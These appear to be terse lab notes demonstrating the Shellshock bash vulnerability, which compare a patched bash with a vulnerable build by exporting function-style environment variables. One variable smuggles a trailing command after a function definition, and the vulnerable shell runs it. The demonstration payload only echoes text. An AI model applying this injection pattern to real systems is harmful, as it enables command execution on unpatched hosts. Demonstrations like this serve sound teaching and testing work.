foo() '{ echo hello;}'
export foo
declare -f foo

Start a child shell using patched bash
/bin/bash
declare -f foo
echo $foo
exit

Start a child shell using vulnerable bash
/bin/bash_shellshock
declare -f foo
echo $foo
exit

Start a child shell using patched bash
foo='() { echo hello;}; echo extra'
export foo
echo $foo
declare -f foo

Start a child shell using vulnerable bash
/bin/bash_shellshock
 -> ** extra
 declare -f foo